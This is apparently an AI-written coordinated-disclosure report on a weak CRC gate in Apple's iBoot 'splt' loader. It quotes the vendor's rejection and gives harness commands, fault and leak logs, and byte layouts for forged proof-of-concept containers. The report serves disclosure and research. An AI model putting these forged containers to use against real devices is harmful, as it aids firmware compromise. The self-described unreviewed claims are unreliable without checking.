> **NOTICE — AI-GENERATED SECURITY RESEARCH.** This document was written 100% by
> autonomous AI agents (no human authoring or line-by-line review pass — expect slop).
> It exists solely for authorized security research and coordinated disclosure to the
> affected vendor. All claims cite checkable artifacts (offsets, receipts, commands);
> re-verify before trusting any of them. PoC files are minimal triage reproducers,
> not weapons. Do not use against systems you do not own or may not test.

# Forged-integrity staged container selects arbitrary decompressor in iBoot splt loader

> **Vendor disposition — Apple Product Security (submitted 26–27 Aug 2026 with OE11073045811 / OE110730442251; not accepted as a delivery path).**
> This report was submitted as the **delivery argument** for the DEFLATE and LZVN decoder
> findings, and Apple declined it as such:
> *"The splt package restates the precondition rather than removing it. Your own analysis gives
> the requirement as control of the staged blob during manufacturing or upgrade staging, gated by
> hardware policy. The evidence provided is a host harness that calls selected firmware routines
> directly, with the algorithm identifier and loader context supplied by the harness rather than
> by the container, so it does not show the boot loader reaching that code with attacker supplied
> input."* — and *"the route you outline for getting untrusted data there depends on a separate
> flaw that hasn't been shown to work."*
>
> Read this report as a **staging-position precondition**, not an established attacker path. The
> unkeyed-CRC analysis of the `'splt'` integrity gate stands as a description of the gate's
> strength; what it does not establish is that an attacker without manufacturing/upgrade staging
> control can put bytes through it.

## Summary

The iBoot `'splt'` staged-container integrity gate validates an attacker-malleable
structure with an **unkeyed CRC-32** whose hashed span **excludes every chunk payload**
(and the magic and stored-CRC field itself). A container forged against that weak check
is accepted (`ret=1`) and then supplies the decompression **algorithm id** (loader
ctx+0x54) passed verbatim to the shared dispatcher, plus declared chunk lengths driving
the source-cursor walk: anyone who can place a staged blob can make the boot loader
*choose* any registered decoder and feed it unchecked bytes, converting known codec
defects (OOB read, hard fault) into reachable-with-any-staged-input issues in this
loader's operating context. Shown on two shipping builds — mBoot-18000.**162.8**
(iOS 26.6, 23G71) and mBoot-18000.**162.10** (iOS 26.6.1, 23G83) — byte-deterministic
across >=3 runs per build.

## Affected software

| Build | Firmware | Gate | Loader | Fallback arm | Fallback dst-fmt | Dispatcher |
|---|---|---|---|---|---|---|
| OLD | mBoot-18000.162.8 (iOS 26.6 23G71), `iboot_dec.bin` | `FUN_0014B4B8` | `FUN_0014B580` | `FUN_001CA6AC` | `FUN_00199CD0` | `FUN_001EB3C8` |
| NEW | mBoot-18000.162.10 (iOS 26.6.1 23G83), `iboot_dec_23g83.bin` | `FUN_0014B678` (+0x1C0) | `FUN_0014B73C` (+0x1BC) | `FUN_001CA718` (+0x6C) | `FUN_00199EA4` (+0x1D4) | `FUN_001EB448` (+0x80) |

Also: CRC wrapper `FUN_001592F4`->`FUN_001594AC`; match-copier fault PC `0x1EA188`->
`0x1EA208`; bad-CRC abort executes the SupervisorCall path `0x00036F74`->`0x00036F9C`.
Offsets are file offsets in the decrypted images (address == offset); genuine shipped
binaries executed natively.

## Root cause

**CRC coverage span.** In the gate (`re_disasm_crosscheck.txt` §A):

```
162.8   @0x14B508: lsl x8,x8,#2 ; add x9,x8,#0x18 ; cmp x9,w4,uxtw ; b.hs abort
        @0x14B518: add x4,x8,#0x10      ; length = cnt*4+0x10
        @0x14B51C: add x0,x19,#8        ; start  = hdr+8
        @0x14B530: bl  FUN_001592F4     ; unkeyed zlib-poly CRC-32
        @0x14B534: ldr w8,[x19,#4] ; cmp w0,w8 ; b.ne panic   ; vs stored CRC
162.10  identical sequence @0x14B6C8..0x14B6F8 (wrapper FUN_001594AC)
```

Hashed span = `[hdr+8, hdr+cnt*4+0x18)` — only the free fields + flag + count +
declared-length table. **Not covered:** the magic (checked separately), the stored CRC
word itself, and **all chunk-payload bytes**. Algorithm = zlib `crc32()` (reflected,
poly `0xEDB88320`; firmware helper `FUN_00159428@0x159434`, table `.bss@0x3EFC14`,
162.8 offsets). Per-file inputs/outputs: `poc_crc32_notes.txt`.

**ctx+0x54 flow.** Loader reads `w27=[ctx+0x48]` @`0x14B61C`, id `w20=[ctx+0x54]`
@`0x14B620`, calls dispatcher `bl FUN_001EB3C8` @`0x14B748` (162.10:
`0x14B7D8`/`0x14B7DC`/`0x14B904`). The gate never constrains the decoder choice; the
dispatcher compares id `0x205` inline (`mov w9,#0x205` @`0x1EB3F8`/`0x1EB478`) and
dispatches bvx/LZ ids (`0x8A1`,`0x891`,`0x100`,`0x101`,`0xA18`) via the same `w20`.

**Fallback arm.** The CRC-failure path does not discard the structure either:
`FUN_001CA6AC`/`FUN_001CA718` calls the dst-formatter `FUN_00199CD0` (@`0x1CA788`) /
`FUN_00199EA4` (@`0x1CA7F4`), which reads a descriptor id at **+0x24**
(`ldr w0,[x23,#0x24]` @`0x199DE0` / @`0x199FB4`) and reaches the **same dispatcher**
(`bl 0x1EB3C8` @`0x199E1C` / `bl 0x1EB448` @`0x199FF0`): a degraded-integrity parse
still routes attacker-selected decoders.

**162.8 -> 162.10 delta.** Aligned diff of the gate bodies shows one structural
change: the x3 argument setup for the CRC call moved from inline
`adrp x3,#0x201000; add x3,#0xBA8` (162.8 `0x14B520`) to a call at `0x14B6E0` of
`FUN_0014CC54` = three-instruction stub `adrp x3,#0x201000; add x3,#0xC28; ret`
(materializes the context pointer only). Validation semantics unchanged; every defect
above is present in both builds.

## Reproduction

Harness: `chain.c` (modes `gate`/`parse`/`chain`/`full`/`fwd`/`rce`) plus the
independent file driver `minpoc.c`. Both map the shipped image R-X and call real
firmware functions under a signal guard.

```bash
cd /tmp/ds_iboot/harness && clang -O2 -arch arm64 -o chain chain.c \
  && clang -O2 -arch arm64 -o minpoc minpoc.c
NEW=/tmp/ds_iboot/23g83/iboot_dec_23g83.bin             # DS_FW unset = 162.8
./chain gate;                 DS_FW=$NEW ./chain gate   # 1-2) full gate matrix per build
./chain chain;                DS_FW=$NEW ./chain chain  # 3-4) benign/leak/fault cells
./minpoc ../Report4_SPLT/poc_min_gate.bin disp 205      # 5) shipped .bin re-accepted+decoded
./minpoc ../Report4_SPLT/poc_min_tampered_same_crc.bin disp 205  # 6) same-CRC tamper control
./minpoc ../Report4_SPLT/poc_cell3.bin gate             #    fault container re-ACCEPTED
./chain full   # 7) end-to-end attempt: dies in mutex slowpath svc on macOS - expected
```

## Evidence

Quoted from the fresh logs in this folder (`...` = elided fields; full lines on file).
Each decisive cell ran **3x per build**; normalizing only host ASLR addresses, runs are
byte-identical (`run2==run1 && run3==run1`, all four `retest_*` logs); PoC files
regenerate with stable SHA-256.

Forged-CRC acceptance + negative controls — `retest_1628_gate.log` (162.10 identical
except abort PC):

```
[container] len=1640 magic=746c7073 crc=d2664c67 flag=1 cnt=1 declen0=1612
G-pos  valid            : ret=1 faulted=0 -> ACCEPT(real gate)
G-mag  magic='xspl'     : ret=0 faulted=0 -> CLEAN-FALSE
G-crc  bad CRC          : faulted=1 sig=12 pc_off=225140 -> ABORT-PATH-FIRED   (162.10: pc_off=225180)
G-size blob=cnt*4+0x18  : faulted=1 sig=14 -> ABORT-PATH-FIRED
G-flag flag=0           : faulted=1 sig=14 -> ABORT-PATH-FIRED
G-rng  hdr outside range: faulted=1 sig=14 -> ABORT-PATH-FIRED
```

Attacker-chosen decoder id drives real dispatch — `retest_1628_chain.log` /
`retest_23g83_chain.log` (values identical across builds except fault PC):

```
[benign control D=23  algo=0x8a1] container=1640B gate: ret=1 faulted=0 PASS
  chunk loop iter1: ret=124 produced=124 ... CANARY-hits=0 out[47..54]='AAAAAAAA'
  model: warm32=1 full=1 (produced==124 want==124)          # decode model-exact
[leak D=56            algo=0x8a1] container=1640B gate: ret=1 faulted=0 PASS
  chunk loop iter1: ret=124 ... CANARY-hits=1 LEAK-first@49 out[47..54]='K-CANARY'
[leak D=56            algo=0x891] ... ret=0 ... CANARY-hits=0   # id selects different decoder
[fault D=262139       algo=0x8a1] container=1640B gate: ret=1 faulted=0 PASS
  chunk loop iter1: ret=-9999 faulted=1 sig=10 FAULT-pc=off+1ea188 ... delta_vs_dstbegin=-262092  (162.8)
  chunk loop iter1: ret=-9999 faulted=1 sig=10 FAULT-pc=off+1ea208 ... delta_vs_dstbegin=-262092  (162.10)
```

Minimal 37-B container + same-CRC payload tamper — `retest_minimal.log` (all 6 runs,
both builds, identical):

```
[minpoc] poc=poc_min_gate.bin len=37 magic=746c7073 stored_crc=b2281136 ...
[minpoc] gate(blob=37): ret=1 -> ACCEPT
[minpoc] disp(algo=0x205): ret=4 produced-first16=504f4321 ascii='POC!' CANARY-hits=0
[minpoc] poc=poc_min_tampered_same_crc.bin len=37 ... stored_crc=b2281136 ...
[minpoc] gate(blob=37): ret=1 -> ACCEPT          <- modified payload, same CRC, still accepted
[minpoc] disp(algo=0x205): ret=4 produced-first16=504f5821 ascii='POX!' CANARY-hits=0
```

Static cross-check: `re_disasm_crosscheck.txt` §§A–H (both builds; span constants,
ctx+0x54 loads, fallback dispatcher call, 162.10 stub diff).

## Exploitability analysis

1. **Arbitrary decoder selection.** The accepted structure supplies ctx+0x54, so the
   loader can be pointed at any registered decoder over attacker bytes. Empirically:
   id `0x8A1` gives a model-exact decode (`produced=124`, `warm32=1 full=1`), a known
   OOB-read (`CANARY-hits=1`: dst[-9..-2] copied into output) and a deterministic
   hard fault in the match copier (`pc 0x1EA188`/`0x1EA208`, access `-262092` vs dst
   begin); id `0x891` rejects the same stream (id-driven dispatch proven); id `0x205`
   decodes raw-deflate stored blocks from the 37-B container. Ids `0x8A1`/`0x205`/
   `0x101`/`0x100` are selectable and map to codecs with publicly known parser
   fragility: any memory-safety bug in them becomes reachable **without defeating the
   intended integrity check**, which cannot bind payloads to what was authorized.
2. **Uncovered-payload forgery.** Flipping payload bytes leaves the stored CRC valid,
   the gate still accepts, and modified content flows into decoding (`POX!`): an
   author iterates payloads freely against the decoder while remaining
   "integrity-valid".
3. **Downstream consumers.** Decoded records feed further staging steps identified
   statically (162.8 offsets): digest checks (adler32 `0x158FEC`, record checksum
   `0x1709E8`), bank load (`0x1725C4`), NVRAM commit (`0x16FA4C`), protected-name
   gate (`0x15E05C`). The chunk-loop return rule (`ret==0 || ret&3` abort) is an
   attacker-visible status oracle, and record homing rides the same uncovered lengths
   — malformed output meets code that assumes authenticated input.
4. **Delivery context (stated honestly).** The loader runs during manufacturing/
   upgrade combo-image staging; reaching it requires control of the staged blob in
   that handoff, gated by hardware strap/fuse policy. Standard boot verifies
   signatures pre-parse, so this is not a remote/post-market attack alone. Severity =
   **boundary-amplifier**: "signature-verified image" degrades to "CRC skeleton over
   attacker-chosen decompressor inputs", making every decoder weakness here
   exploitable for whoever satisfies the staging precondition. High-severity within
   that context (earliest boot stage, demonstrated deterministic OOB-read and fault),
   with the constrained delivery vector noted.

## Target Flag note

Apple's bounty "Target Flag" mechanism covers userspace-kernel escalation and TCC
compromise categories and has no classification for boot-loader research; per program
guidelines for such targets, the detailed exploitability analysis above substitutes.

## Validation method disclosure

Evidence = **native execution of genuine shipped firmware instructions**: each
decrypted image is mapped R-X at its own offsets and its real functions
(`FUN_0014B4B8`, `FUN_0014B580`, `FUN_001EB3C8` + 162.10 counterparts) are called from
a small POSIX driver under SIGSEGV/SIGBUS/SIGILL/SIGTRAP/SIGABRT/SIGSYS guards with
apron buffers and canary markers. Host ASLR affects only printed absolute addresses;
all firmware-side values (returns, counts, fault PCs/deltas, CRC words, decoded bytes)
are address-independent, repeated identically >=3x per build/cell. Static claims were
Capstone-verified on both builds incl. an aligned gate-body diff
(`re_disasm_crosscheck.txt`); `.bin` artifacts were re-accepted from disk by `minpoc`,
which shares no builder code with the generator.

## File manifest

| File | Contents |
|---|---|
| `README.md` | this report |
| `poc_cell3.bin` | 1640-B forged-CRC container; hostile bvx1 stream (D=262139) -> hard fault in match copier |
| `poc_cell1.bin` | 1640-B forged-CRC container; hostile bvx1 stream (D=56) -> OOB-read leak of dst[-9..-2] |
| `poc_min_gate.bin` | 37-B minimal forged-CRC container proving acceptance + dispatch (algo 0x205 decodes `POC!`) |
| `poc_min_tampered_same_crc.bin` | `poc_min_gate.bin` with payload byte `C`->`X`; identical CRC; gate still ACCEPTs, output changes |
| `poc_crc32_notes.txt` | CRC-32 algorithm, hashed span, per-file hashed bytes vs stored values, tamper proof |
| `retest_<build>_gate.log` (1628, 23g83) | gate matrix per build, 3 deterministic runs each |
| `retest_<build>_chain.log` (1628, 23g83) | benign/leak/fault cells per build, 3 deterministic runs each |
| `retest_minimal.log` | minimal-container + tamper cells, both builds, 3 deterministic runs each |
| `re_disasm_crosscheck.txt` | Capstone disassembly cross-check, both builds (§§A–H) |
| `run_gate.log`, `run_23g83_chain.log` | earlier-session runs kept for provenance (superseded by retest_*) |
| `chain.c` | harness source (modes: gate/parse/chain/full/fwd/rce) |

### poc_cell3.bin field layout (byte-by-byte)

Header schema (little-endian; identical for `poc_cell1.bin` and `poc_min_gate.bin`;
only payload differs between the first two):

```
+0x00  73 70 6c 74                    magic 'splt'  (ASCII LE)      NOT covered by CRC
+0x04  8b c5 6f 1a                    stored CRC32 = 0x1A6FC58B     NOT covered by CRC
+0x08  dd cc bb aa                    field_a = 0xAABBCCDD          covered
+0x0C  ef be ad de                    field_b = 0xDEADBEEF          covered
+0x10  01 00 00 00                    flag = 1 (must be != 0)       covered
+0x14  01 00 00 00                    count = 1 chunk               covered
+0x18  4c 06 00 00                    declared length[0] = 0x64C    covered
+0x1C  ...1612 bytes...               chunk payload (bvx1 stream)   NOT covered by CRC
```

Payload anatomy of `poc_cell3.bin` (stream-relative; the stream occupies container
`+0x1C`..`+0x667`, total 0x64C = 1612 B):

```
str+0x000  62 76 78 31                    'bvx1' block magic
str+0x004  20 00 00 00                    decoded-size field (T*(L+M) = 32)
str+0x008..0x303                          bvx1 header: literal/match/dist/blend
                                          frequency tables + coding params
str+0x304..0x323                          32-B compressed bit-plane (distance extras)
str+0x324  second 'bvx1' block (hostile: T=4 L=15 M=8, distance D=262139)
str+end    62 76 78 24                    'bvx$' terminator (container +0x664)
```

For `poc_min_gate.bin` (37 B) the payload is a raw-deflate stored block instead:
`01 04 00 fb ff 50 4f 43 21` = BFINAL=1 BTYPE=00, LEN=4, NLEN=0xFFFB, literal
`'POC!'`; dispatched with algorithm id 0x205. Hashed spans and recomputed values for
all four files: `poc_crc32_notes.txt`.
